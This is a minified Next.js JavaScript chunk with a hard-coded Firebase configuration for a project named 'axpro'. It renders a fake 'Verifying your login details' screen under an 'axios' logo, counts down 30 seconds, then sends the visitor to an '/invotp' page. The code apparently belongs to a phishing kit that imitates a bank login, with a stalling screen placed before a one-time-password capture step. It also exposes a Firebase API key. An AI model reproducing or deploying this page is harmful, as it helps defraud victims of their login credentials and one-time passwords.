(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[208],{2670:function(e,s,t){Promise.resolve().then(t.bind(t,912))},6070:function(e,s,t){"use strict";t.d(s,{F:function(){return r},db:function(){return c}});var n=t(994),a=t(4086),i=t(2307);let l=(0,n.ZF)({apiKey:"AIzaSyDhB57v4wZTVXPKOCSteLD8hfJE7WXooK0",authDomain:"axpro-53893.firebaseapp.com",databaseURL:"https://axpro-53893-default-rtdb.firebaseio.com",projectId:"axpro-53893",storageBucket:"axpro-53893.appspot.com",messagingSenderId:"627547144156",appId:"1:627547144156:web:56e5e090d9161f222c5919",measurementId:"G-7NXL28XHGG"}),c=(0,a.ad)(l),r=(0,i.N8)(l)},912:function(e,s,t){"use strict";t.r(s),t.d(s,{default:function(){return Page}});var n=t(7437);t(6691);var a=t(2265);t(4086),t(6070);var i=t(4033);function Page(){let[e,s]=(0,a.useState)(),[t,l]=(0,a.useState)(),[c,r]=(0,a.useState)(!1),o=(0,i.useRouter)(),[d,u]=(0,a.useState)(30);(0,a.useEffect)(()=>{let e=setInterval(()=>{d>0?u(d-1):(clearInterval(e),o.push("/invotp"),console.log("Countdown reached zero!"))},1e3);return()=>{clearInterval(e)}},[d]);let f=Math.floor(d/60),m=d%60,x="".concat(f,":").concat(m<10?"0":"").concat(m);return(0,n.jsx)("div",{className:"flex min-h-screen flex-col items-center justify-between",children:(0,n.jsx)("div",{className:"w-full justify-center flex items-center",children:(0,n.jsxs)("div",{id:"enterDetails",className:"w-full",children:[(0,n.jsx)("div",{className:"bg-pink-800 h-[60px] flex items-center justify-start",children:(0,n.jsx)("img",{className:"h-8 ml-5",src:"/axios-logo.png"})}),(0,n.jsx)("div",{className:"w-full justify-center flex mt-5 font-md text-xl font-bold",children:"Processing..."}),(0,n.jsx)("div",{className:"bg-white m-5",children:(0,n.jsx)("div",{children:(0,n.jsx)("div",{id:"tab3-content",children:(0,n.jsxs)("div",{className:"pt-5",children:[(0,n.jsx)("div",{className:"flex justify-center items-center",children:(0,n.jsx)("span",{className:"loading loading-spinner loading-lg"})}),(0,n.jsx)("div",{className:"flex text-lg justify-center mt-5",children:"Please wait... Verifying your login details"}),(0,n.jsxs)("span",{className:"flex text-lg justify-center",children:["Redirecting in ",x," seconds."]})]})})})}),(0,n.jsx)("div",{className:"w-full",children:(0,n.jsx)("img",{src:"",alt:"",className:"w-full"})})]})})})}}},function(e){e.O(0,[358,481,462,758,971,864,744],function(){return e(e.s=2670)}),_N_E=e.O()}]);